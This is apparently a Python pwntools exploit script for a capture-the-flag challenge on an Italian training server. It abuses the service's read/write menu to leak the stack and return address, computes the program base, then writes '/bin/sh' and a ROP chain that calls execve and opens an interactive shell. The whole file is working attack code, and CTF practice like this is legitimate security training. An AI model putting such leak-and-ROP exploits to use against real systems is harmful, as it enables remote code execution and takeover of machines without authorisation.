from pwn import *

r = remote("predatori.challs.olicyber.it", 15006)

def menu(choice: int):
    r.sendlineafter(b"3) Esci", f"{choice}".encode())

def write(where, what):
    menu(2)
    r.sendafter(b"Indirizzo:", where)
    r.sendafter(b"bytes:", b"8")
    r.sendafter(b"scrivere?", what)
    r.recvuntil(b"Fatto")
    r.recvline()

def read(where):
    menu(1)
    r.sendafter(b"Indirizzo:", where)
    r.recvuntil(b"richiesta.")
    r.recvline()
    return r.recvline().replace(b"1) LeggiCosaDove\n", b"")

for i in range(0, 255, 8):
    data = read(bytes([i]))
    try:
        print(hex(u64(data)))
    except Exception:
        pass

# 0x0
# 0x0
# 0x0
# 0x0
# 0x7e2b5edc8104
# 0x7e2b5ee4c278
# 0x0
# 0x620bcd20995f200
# 0x7fffe33f3c00        ->      RBP
# 0x7e2b5edc849e        ->      RET ADDR

print()
rbp_addr = input("Inserire RBP: ")
rbp_addr = int(rbp_addr, 16)

ret_addr_main = rbp_addr + 8

ret_addr_rww = input("Inserire RET: ")
ret_addr_rww = int(ret_addr_rww, 16)
print()

base_pie = ret_addr_rww - 0xa49e

pop_rax = base_pie + 0x49e67
pop_rdi = base_pie + 0x099d1
pop_rsi = base_pie + 0x103ce
pop_rdx = base_pie + 0x0990f
syscall = base_pie + 0x0941e

bin_sh = rbp_addr - 0x40

write(p64(bin_sh), b"/bin/sh\x00")
write(p64(ret_addr_main), p64(pop_rdi))
write(p64(ret_addr_main + 8), p64(bin_sh))
write(p64(ret_addr_main + 16), p64(pop_rsi))
write(p64(ret_addr_main + 24), p64(0x00))
write(p64(ret_addr_main + 32), p64(pop_rdx))
write(p64(ret_addr_main + 40), p64(0x00))
write(p64(ret_addr_main + 48), p64(pop_rax))
write(p64(ret_addr_main + 56), p64(0x3b))
write(p64(ret_addr_main + 64), p64(syscall))

r.interactive()